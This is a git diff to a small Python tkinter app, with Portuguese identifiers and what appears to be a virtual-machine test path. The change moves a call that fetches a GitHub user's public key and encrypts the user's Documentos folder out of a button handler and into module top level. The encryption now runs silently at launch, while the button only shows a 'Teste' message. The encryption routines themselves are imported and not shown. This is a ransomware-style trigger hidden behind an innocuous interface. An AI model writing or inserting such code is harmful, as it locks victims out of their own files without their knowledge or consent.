@@ -5,14 +5,15 @@ from tkinter import messagebox
 
 from main import GITHUB_USER, encriptar_pasta, obter_chave_publica_github
 
+pasta = os.path.expanduser("/home/vboxuser/Documentos")
+    
+chave_pub = obter_chave_publica_github(GITHUB_USER)
+    
+if chave_pub:
+    encriptar_pasta(pasta, chave_pub)
+
 # --- Funções do App ---
 def acao_botao():
-    pasta = os.path.expanduser("/home/vboxuser/Documentos")
-    
-    chave_pub = obter_chave_publica_github(GITHUB_USER)
-    
-    if chave_pub:
-        encriptar_pasta(pasta, chave_pub)
     messagebox.showinfo("Teste")
 
 def fechar():
